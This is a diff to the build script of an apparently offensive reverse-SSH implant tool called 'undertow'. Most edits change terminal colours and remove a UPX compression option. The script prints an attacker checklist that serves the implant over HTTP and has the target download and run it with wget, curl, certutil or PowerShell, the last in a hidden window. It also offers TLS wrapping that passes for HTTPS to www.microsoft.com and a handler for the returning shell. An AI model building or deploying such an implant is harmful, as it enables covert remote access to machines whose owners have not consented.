@@ -4,43 +4,40 @@
 
 set -e
 
-# Catppuccin Mocha color palette (https://catppuccin.com/palette)
+# RFS Cyclorama Dawn terminal palette (BRAND.md §11): truecolor row, with a
+# 16-color row for terminals without truecolor. Colour is never the only
+# signal — every status line also starts with a bracketed ASCII tag.
 setup_colors() {
-    if [ -t 1 ]; then
-        # Prefer true-color (24-bit) for accurate Catppuccin Mocha colors
-        if [ "${COLORTERM:-}" = "truecolor" ] || [ "${COLORTERM:-}" = "24bit" ] || \
-           { command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 256 ]; }; then
-            RED=$(printf '\033[38;2;243;139;168m')       # #f38ba8
-            GREEN=$(printf '\033[38;2;166;227;161m')     # #a6e3a1
-            YELLOW=$(printf '\033[38;2;249;226;175m')    # #f9e2af
-            BLUE=$(printf '\033[38;2;137;180;250m')      # #89b4fa
-            MAUVE=$(printf '\033[38;2;203;166;247m')     # #cba6f7
-            PEACH=$(printf '\033[38;2;250;179;135m')     # #fab387
-            TEAL=$(printf '\033[38;2;148;226;213m')      # #94e2d5
-            LAVENDER=$(printf '\033[38;2;180;190;254m')  # #b4befe
-            SUBTEXT=$(printf '\033[38;2;166;173;200m')   # #a6adc8
-            BOLD=$(printf '\033[1m')
-            DIM=$(printf '\033[2m')
-            RESET=$(printf '\033[0m')
-        elif command -v tput >/dev/null 2>&1; then
-            # Fallback to basic tput for older terminals
-            RED=$(tput setaf 1) GREEN=$(tput setaf 2) YELLOW=$(tput setaf 3) BLUE=$(tput setaf 4)
-            MAUVE=$(tput setaf 5) PEACH=$(tput setaf 3) TEAL=$(tput setaf 6) LAVENDER=$(tput setaf 4)
-            SUBTEXT="" BOLD=$(tput bold) DIM="" RESET=$(tput sgr0)
-        else
-            RED="" GREEN="" YELLOW="" BLUE="" MAUVE="" PEACH="" TEAL="" LAVENDER="" SUBTEXT="" BOLD="" DIM="" RESET=""
-        fi
+    if [ -n "${NO_COLOR:-}" ] || [ "${TERM:-}" = "dumb" ] || [ ! -t 1 ]; then
+        FAULT="" MINT="" AMBER="" STEEL="" MUTE="" BEACON="" BOLD="" DIM="" RESET=""
+        return
+    fi
+    BOLD=$(printf '\033[1m')
+    DIM=$(printf '\033[2m')
+    RESET=$(printf '\033[0m')
+    if [ "${COLORTERM:-}" = "truecolor" ] || [ "${COLORTERM:-}" = "24bit" ]; then
+        FAULT=$(printf '\033[38;2;255;92;108m')    # #FF5C6C Signal Crimson
+        MINT=$(printf '\033[38;2;61;220;151m')     # #3DDC97
+        AMBER=$(printf '\033[38;2;255;194;71m')    # #FFC247
+        STEEL=$(printf '\033[38;2;116;184;232m')   # #74B8E8
+        MUTE=$(printf '\033[38;2;179;181;192m')    # #B3B5C0
+        BEACON=$(printf '\033[38;2;255;146;84m')   # #FF9254
     else
-        RED="" GREEN="" YELLOW="" BLUE="" MAUVE="" PEACH="" TEAL="" LAVENDER="" SUBTEXT="" BOLD="" DIM="" RESET=""
+        FAULT=$(printf '\033[31m')   # red
+        MINT=$(printf '\033[32m')    # green
+        AMBER=$(printf '\033[33m')   # yellow
+        STEEL=$(printf '\033[36m')   # cyan
+        MUTE=$(printf '\033[90m')    # bright black
+        BEACON=$(printf '\033[91m')  # bright red
     fi
 }
 setup_colors
 
 # Status output functions
-info()    { printf "%s[*]%s %s\n" "$BLUE" "$RESET" "$1"; }
-success() { printf "%s[+]%s %s\n" "$GREEN" "$RESET" "$1"; }
-warn()    { printf "%s[!]%s %s\n" "$YELLOW" "$RESET" "$1"; }
-error()   { printf "%s[-]%s %s\n" "$RED" "$RESET" "$1"; }
+info()    { printf "%s[i]%s %s\n" "$STEEL" "$RESET" "$1"; }
+success() { printf "%s[ok]%s %s\n" "$MINT" "$RESET" "$1"; }
+warn()    { printf "%s[!]%s %s\n" "$AMBER" "$RESET" "$1"; }
+error()   { printf "%s[x]%s %s\n" "$FAULT" "$RESET" "$1" >&2; }
 die()     { error "$1"; exit 1; }
 
 # Default configuration
@@ -51,7 +48,6 @@ LUSER="svc"
 RS_PASS=""
 RS_PUB=""
 RS_SHELL=""
-COMPRESS=false
 NOCLI=false
 DAEMONIZE=false
 TLS=false
@@ -85,7 +81,7 @@ EXAMPLES:
 
     # Advanced options
     ./build.sh reverse 10.10.14.5:443 --user kali --bind-port 0
-    ./build.sh reverse 192.168.1.10:22 --password "secret" --compress
+    ./build.sh reverse 192.168.1.10:22 --password "secret"
     ./build.sh listen 4444 --shell /bin/sh --nocli
 
 OPTIONS:
@@ -94,7 +90,6 @@ OPTIONS:
     -p, --password PASS     Custom password (default: auto-generated)
     -k, --pubkey FILE       SSH public key file for authentication
     -s, --shell PATH        Default shell (default: /bin/bash)
-    -c, --compress          Compress binaries with UPX
     --nocli                 Disable runtime CLI (fully hardcoded binary)
     --daemonize             Auto-detach on launch (runs in background, frees the terminal)
     --tls                   Wrap SSH inside TLS (looks like HTTPS on the wire)
@@ -175,16 +170,11 @@ validate_port() {
 
 check_dependencies() {
     if ! command -v go >/dev/null 2>&1; then
-        die "Go is not installed. Please install Go 1.15 or later."
+        die "Go is not installed. Please install Go 1.26 or later."
     fi
 
     if ! command -v make >/dev/null 2>&1; then
         die "Make is not installed."
-    fi
-
-    if [ "$COMPRESS" = true ] && ! command -v upx >/dev/null 2>&1; then
-        warn "UPX not found, skipping compression"
-        COMPRESS=false
     fi
 }
 
@@ -284,12 +274,10 @@ build() {
             info "  TLS SNI:  ${BOLD}www.microsoft.com (default)${RESET}"
         fi
     fi
-    [ "$COMPRESS" = true ] && info "  Compress: ${BOLD}yes${RESET}"
     echo ""
 
     # Run make
     local make_target="build"
-    [ "$COMPRESS" = true ] && make_target="compressed"
 
     # Dry-run mode: show what would be built without executing
     if [ "$DRY_RUN" = true ]; then
@@ -339,11 +327,6 @@ build() {
         for file in undertow*; do
             [ -f "$file" ] || continue
             case "$file" in
-                upx_undertowx64.exe) mv "$file" "${prefix}-windows-x64.exe" 2>/dev/null || true ;;
-                upx_undertowx86.exe) mv "$file" "${prefix}-windows-x86.exe" 2>/dev/null || true ;;
-                upx_undertowx64)     mv "$file" "${prefix}-linux-x64" 2>/dev/null || true ;;
-                upx_undertowx86)     mv "$file" "${prefix}-linux-x86" 2>/dev/null || true ;;
-                upx_undertow)        mv "$file" "${prefix}-current" 2>/dev/null || true ;;
                 undertowx64.exe)     mv "$file" "${prefix}-windows-x64.exe" 2>/dev/null || true ;;
                 undertowx86.exe)     mv "$file" "${prefix}-windows-x86.exe" 2>/dev/null || true ;;
                 undertowx64)         mv "$file" "${prefix}-linux-x64" 2>/dev/null || true ;;
@@ -369,38 +352,46 @@ build() {
 # Handler for undertow callbacks from $saved_host
 # Generated by build.sh
 
-# Colors (Catppuccin Mocha)
-if [ -t 1 ]; then
-    GREEN=\$(printf '\033[38;2;166;227;161m')     # #a6e3a1
-    YELLOW=\$(printf '\033[38;2;249;226;175m')    # #f9e2af
-    BLUE=\$(printf '\033[38;2;137;180;250m')      # #89b4fa
-    MAUVE=\$(printf '\033[38;2;203;166;247m')     # #cba6f7
-    TEAL=\$(printf '\033[38;2;148;226;213m')      # #94e2d5
+# Colors (RFS Cyclorama Dawn, BRAND.md §11)
+if [ -n "\${NO_COLOR:-}" ] || [ "\${TERM:-}" = "dumb" ] || [ ! -t 1 ]; then
+    MINT="" AMBER="" STEEL="" MUTE="" BEACON="" BOLD="" RESET=""
+elif [ "\${COLORTERM:-}" = "truecolor" ] || [ "\${COLORTERM:-}" = "24bit" ]; then
+    MINT=\$(printf '\033[38;2;61;220;151m')     # #3DDC97
+    AMBER=\$(printf '\033[38;2;255;194;71m')    # #FFC247
+    STEEL=\$(printf '\033[38;2;116;184;232m')   # #74B8E8
+    MUTE=\$(printf '\033[38;2;179;181;192m')    # #B3B5C0
+    BEACON=\$(printf '\033[38;2;255;146;84m')   # #FF9254
     BOLD=\$(printf '\033[1m')
     RESET=\$(printf '\033[0m')
 else
-    GREEN="" YELLOW="" BLUE="" MAUVE="" TEAL="" BOLD="" RESET=""
+    MINT=\$(printf '\033[32m')    # green
+    AMBER=\$(printf '\033[33m')   # yellow
+    STEEL=\$(printf '\033[36m')   # cyan
+    MUTE=\$(printf '\033[90m')    # bright black
+    BEACON=\$(printf '\033[91m')  # bright red
+    BOLD=\$(printf '\033[1m')
+    RESET=\$(printf '\033[0m')
 fi
 
 echo ""
-echo "\${TEAL}[*]\${RESET} \${BOLD}Undertow Handler\${RESET}"
-echo "\${MAUVE}    ─────────────────────────────────────────────────────────\${RESET}"
+echo "\${BEACON}[i]\${RESET} \${BOLD}Undertow Handler\${RESET}"
+echo "\${MUTE}    ─────────────────────────────────────────────────────────\${RESET}"
 echo ""
-echo "\${BLUE}[*]\${RESET} Listening on port:  \${BOLD}$listen_port\${RESET}"
-echo "\${BLUE}[*]\${RESET} Expecting callback: \${BOLD}$saved_host\${RESET}"
-echo "\${BLUE}[*]\${RESET} Username:           \${BOLD}$connect_user\${RESET}"
-echo "\${BLUE}[*]\${RESET} Password:           \${BOLD}$saved_pass\${RESET}"
+echo "\${STEEL}[i]\${RESET} Listening on port:  \${BOLD}$listen_port\${RESET}"
+echo "\${STEEL}[i]\${RESET} Expecting callback: \${BOLD}$saved_host\${RESET}"
+echo "\${STEEL}[i]\${RESET} Username:           \${BOLD}$connect_user\${RESET}"
+echo "\${STEEL}[i]\${RESET} Password:           \${BOLD}$saved_pass\${RESET}"
 HANDLER_EOF
 
             if [ "$TLS" = true ]; then
                 cat >> "$handler_name" << HANDLER_EOF
-echo "\${BLUE}[*]\${RESET} TLS wrapping:       \${BOLD}enabled\${RESET}"
+echo "\${STEEL}[i]\${RESET} TLS wrapping:       \${BOLD}enabled\${RESET}"
 HANDLER_EOF
             fi
 
             cat >> "$handler_name" << HANDLER_EOF
 echo ""
-echo "\${YELLOW}[!]\${RESET} When you see 'New connection from', run:"
+echo "\${AMBER}[!]\${RESET} When you see 'New connection from', run:"
 HANDLER_EOF
 
             if [ "$BPORT" = "0" ]; then
@@ -408,8 +399,8 @@ HANDLER_EOF
 echo ""
 echo "    \${BOLD}ssh -p <PORT> $connect_user@127.0.0.1\${RESET}"
 echo ""
-echo "\${YELLOW}[!]\${RESET} Random port mode: Look for 'reachable via 127.0.0.1:<PORT>'"
-echo "\${YELLOW}[!]\${RESET} in the connection message below to find the actual port."
+echo "\${AMBER}[!]\${RESET} Random port mode: Look for 'reachable via 127.0.0.1:<PORT>'"
+echo "\${AMBER}[!]\${RESET} in the connection message below to find the actual port."
 HANDLER_EOF
             else
                 cat >> "$handler_name" << HANDLER_EOF
@@ -420,7 +411,7 @@ HANDLER_EOF
 
             cat >> "$handler_name" << HANDLER_EOF
 echo ""
-echo "\${MAUVE}    ─────────────────────────────────────────────────────────\${RESET}"
+echo "\${MUTE}    ─────────────────────────────────────────────────────────\${RESET}"
 echo ""
 
 # Find the listener binary (prefer current platform, then linux-x64)
@@ -434,7 +425,7 @@ elif [ -x "\$SCRIPT_DIR/\${BINARY_PREFIX}-linux-x64" ]; then
 elif [ -x "\$SCRIPT_DIR/\${BINARY_PREFIX}-linux-x86" ]; then
     LISTENER="\$SCRIPT_DIR/\${BINARY_PREFIX}-linux-x86"
 else
-    echo "[-] Error: No listener binary found"
+    echo "[x] Error: No listener binary found"
     echo "    Expected one of:"
     echo "      \$SCRIPT_DIR/\${BINARY_PREFIX}-current"
     echo "      \$SCRIPT_DIR/\${BINARY_PREFIX}-linux-x64"
@@ -457,12 +448,6 @@ HANDLER_EOF
         ls -lh bin/${prefix}* bin/handler-* 2>/dev/null | while read line; do
             echo "  $line"
         done
-
-        # Show compression note if enabled
-        if [ "$COMPRESS" = true ]; then
-            echo ""
-            info "Binaries compressed with UPX (sizes shown above)"
-        fi
     fi
 
     # Show credentials
@@ -474,36 +459,36 @@ HANDLER_EOF
 
     # Show engagement checklist
     echo ""
-    printf "  %s────────────────────────────────────────────────────────────%s\n" "$MAUVE" "$RESET"
-    printf "  %s%sNext Steps%s\n" "$LAVENDER" "$BOLD" "$RESET"
-    printf "  %s────────────────────────────────────────────────────────────%s\n" "$MAUVE" "$RESET"
+    printf "  %s────────────────────────────────────────────────────────────%s\n" "$MUTE" "$RESET"
+    printf "  %s%sNext Steps%s\n" "$BEACON" "$BOLD" "$RESET"
+    printf "  %s────────────────────────────────────────────────────────────%s\n" "$MUTE" "$RESET"
     if [ "$mode" = "reverse" ]; then
         local handler_script="handler-$(sanitize_for_filename "$LHOST")-$LPORT"
         echo ""
-        echo "  ${PEACH}1.${RESET} ${TEAL}${BOLD}ATTACKER${RESET} ${SUBTEXT}-${RESET} Start handler:"
+        echo "  ${STEEL}1.${RESET} ${BEACON}${BOLD}ATTACKER${RESET} ${MUTE}-${RESET} Start handler:"
         echo ""
         echo "     ./bin/$handler_script"
         echo ""
-        echo "  ${PEACH}2.${RESET} ${TEAL}${BOLD}DELIVER${RESET} ${SUBTEXT}-${RESET} Serve binary for download:"
+        echo "  ${STEEL}2.${RESET} ${BEACON}${BOLD}DELIVER${RESET} ${MUTE}-${RESET} Serve binary for download:"
         echo ""
         echo "     ${DIM}(in a second terminal on attacker)${RESET}"
         echo "     python3 -m http.server 8080 -d bin/"
         echo ""
-        echo "  ${PEACH}3.${RESET} ${TEAL}${BOLD}TARGET${RESET} ${SUBTEXT}-${RESET} Download and execute:"
+        echo "  ${STEEL}3.${RESET} ${BEACON}${BOLD}TARGET${RESET} ${MUTE}-${RESET} Download and execute:"
         echo ""
-        echo "     ${SUBTEXT}Linux:${RESET}"
+        echo "     ${MUTE}Linux:${RESET}"
         echo "       wget http://${LHOST}:8080/${prefix}-linux-x64 -O rs && chmod +x rs && ./rs"
         echo "       curl http://${LHOST}:8080/${prefix}-linux-x64 -o rs && chmod +x rs && ./rs"
         echo ""
-        echo "     ${SUBTEXT}Windows (cmd):${RESET}"
+        echo "     ${MUTE}Windows (cmd):${RESET}"
         echo "       certutil -urlcache -split -f http://${LHOST}:8080/${prefix}-windows-x64.exe rs.exe"
         echo "       rs.exe"
         echo ""
-        echo "     ${SUBTEXT}Windows (PowerShell):${RESET}"
+        echo "     ${MUTE}Windows (PowerShell):${RESET}"
         echo "       iwr -uri http://${LHOST}:8080/${prefix}-windows-x64.exe -OutFile rs.exe"
         echo "       Start-Process .\\rs.exe -WindowStyle Hidden"
         echo ""
-        echo "  ${PEACH}4.${RESET} ${TEAL}${BOLD}ATTACKER${RESET} ${SUBTEXT}-${RESET} Connect when callback arrives:"
+        echo "  ${STEEL}4.${RESET} ${BEACON}${BOLD}ATTACKER${RESET} ${MUTE}-${RESET} Connect when callback arrives:"
         echo ""
         if [ "$BPORT" = "0" ]; then
             echo "     ssh -p <PORT> ${LUSER}@127.0.0.1"
@@ -514,31 +499,31 @@ HANDLER_EOF
         echo "     Password: ${RS_PASS}"
     else
         echo ""
-        echo "  ${PEACH}1.${RESET} ${TEAL}${BOLD}DELIVER${RESET} ${SUBTEXT}-${RESET} Serve binary for download:"
+        echo "  ${STEEL}1.${RESET} ${BEACON}${BOLD}DELIVER${RESET} ${MUTE}-${RESET} Serve binary for download:"
         echo ""
         echo "     python3 -m http.server 8080 -d bin/"
         echo ""
-        echo "  ${PEACH}2.${RESET} ${TEAL}${BOLD}TARGET${RESET} ${SUBTEXT}-${RESET} Download and execute:"
+        echo "  ${STEEL}2.${RESET} ${BEACON}${BOLD}TARGET${RESET} ${MUTE}-${RESET} Download and execute:"
         echo ""
-        echo "     ${SUBTEXT}Linux:${RESET}"
+        echo "     ${MUTE}Linux:${RESET}"
         echo "       wget http://<attacker-ip>:8080/${prefix}-linux-x64 -O rs && chmod +x rs && ./rs"
         echo "       curl http://<attacker-ip>:8080/${prefix}-linux-x64 -o rs && chmod +x rs && ./rs"
         echo ""
-        echo "     ${SUBTEXT}Windows (cmd):${RESET}"
+        echo "     ${MUTE}Windows (cmd):${RESET}"
         echo "       certutil -urlcache -split -f http://<attacker-ip>:8080/${prefix}-windows-x64.exe rs.exe"
         echo "       rs.exe"
         echo ""
-        echo "     ${SUBTEXT}Windows (PowerShell):${RESET}"
+        echo "     ${MUTE}Windows (PowerShell):${RESET}"
         echo "       iwr -uri http://<attacker-ip>:8080/${prefix}-windows-x64.exe -OutFile rs.exe"
         echo "       Start-Process .\\rs.exe -WindowStyle Hidden"
         echo ""
-        echo "  ${PEACH}3.${RESET} ${TEAL}${BOLD}ATTACKER${RESET} ${SUBTEXT}-${RESET} Connect to target:"
+        echo "  ${STEEL}3.${RESET} ${BEACON}${BOLD}ATTACKER${RESET} ${MUTE}-${RESET} Connect to target:"
         echo ""
         echo "     ssh -p $LPORT ${LUSER}@<target-ip>"
         echo "     Password: ${RS_PASS}"
     fi
     echo ""
-    printf "  %s────────────────────────────────────────────────────────────%s\n" "$MAUVE" "$RESET"
+    printf "  %s────────────────────────────────────────────────────────────%s\n" "$MUTE" "$RESET"
     echo ""
 }
 
@@ -637,10 +622,6 @@ main() {
                 [ -z "$2" ] && die "--shell requires an argument"
                 RS_SHELL="$2"
                 shift 2
-                ;;
-            -c|--compress)
-                COMPRESS=true
-                shift
                 ;;
             --nocli)
                 NOCLI=true
